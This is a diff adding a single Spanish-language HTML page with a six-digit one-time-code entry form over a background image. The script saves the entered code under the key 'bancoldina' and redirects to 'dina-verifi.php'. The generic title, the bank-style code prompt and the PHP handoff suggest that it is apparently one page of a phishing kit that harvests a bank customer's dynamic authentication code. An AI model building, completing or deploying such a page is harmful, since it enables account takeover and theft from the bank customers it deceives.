@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image-based Website</title>
+    <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    body, html {
+        height: 100%;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #f0f0f0;
+    }
+    .image-container {
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        position: relative;
+    }
+    .image-container img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+    .center-box {
+        position: absolute;
+        top: 60%;
+        left: 49.7%;
+        transform: translate(-50%, -50%);
+        background-color: rgb(255, 255, 255);
+        width: 320px; /* Ajusta el tamaño según sea necesario */
+        height: 60px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        border-radius: 8px;
+    }
+    .center-box .input-container {
+        position: relative;
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        gap: 1px; /* Espacio entre los inputs */
+    }
+    .password-input {
+        width: 40px;
+        height: 60px;
+        text-align: center;
+        font-size: 20px;
+        border: 1px solid #000000;
+        border-radius: 5px;
+        margin-right: 10px; /* Margen entre los inputs */
+    }
+    .button-container {
+        position: absolute;
+        top: 77.5%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        display: flex;
+        flex-direction: column; /* Cambiado a 'column' para poner los botones uno debajo del otro */
+        gap: 24px; /* Espacio entre los botones */
+        transition: top 0.3s ease-in-out; /* Suavizar el movimiento */
+    }
+    .button-container button {
+        padding: 15px 120px;
+        font-size: 16px;
+        border: none;
+        border-radius: 50px;
+        font-weight: bold;
+        color: rgb(1, 1, 1);
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+    }
+    .button-container button:first-child {
+        background-color: #ffda37;
+        border: 1px solid black;
+    }
+    .button-container button:first-child:hover {
+        background-color: #ffda37;
+    }
+    .button-container button:last-child {
+        background-color: #bababa;
+    }
+    .button-container button:last-child:hover {
+        background-color: #bababa;
+    }
+</style>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+</head>
+<body>
+    <div class="image-container">
+        <img src="img/otpcel.jpg" alt="Background Image">
+        <div class="center-box">
+            <div class="input-container">
+                <input type="tel" class="password-input" maxlength="1" id="input1">
+                <input type="tel" class="password-input" maxlength="1" id="input2">
+                <input type="tel" class="password-input" maxlength="1" id="input3">
+                <input type="tel" class="password-input" maxlength="1" id="input4">
+                <input type="tel" class="password-input" maxlength="1" id="input5"> <!-- Nuevo input -->
+                <input type="tel" class="password-input" maxlength="1" id="input6"> <!-- Nuevo input -->
+            </div>
+        </div>
+        <div class="button-container">
+            <button id="continuar">Continuar</button>
+            <button id="cancelar">Cancelar</button>
+        </div>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll('.password-input');
+
+        // Añadir validación de solo números
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const value = e.target.value;
+                // Solo permitir números
+                if (!/^\d$/.test(value)) {
+                    e.target.value = ''; // Borra si no es un número
+                } else {
+                    if (index < inputs.length - 1 && e.target.value !== '') {
+                        inputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        document.getElementById('continuar').addEventListener('click', () => {
+            const inputValues = Array.from(document.querySelectorAll('.password-input'))
+                                      .map(input => input.value)
+                                      .join('');
+            localStorage.setItem('bancoldina', inputValues);
+            window.location.href = 'dina-verifi.php';
+        });
+
+        document.getElementById('cancelar').addEventListener('click', () => {
+            window.location.href = 'index.html';
+        });
+
+        // Detectar apertura del teclado
+        window.addEventListener('resize', () => {
+            const buttonContainer = document.querySelector('.button-container');
+            if (window.innerHeight < 500) {  // Si la altura de la ventana es pequeña, el teclado está abierto
+                buttonContainer.style.top = '90%';  // Mover los botones hacia abajo
+            } else {
+                buttonContainer.style.top = '80.5%';  // Posición original
+            }
+        });
+    </script>
+</body>
+</html>
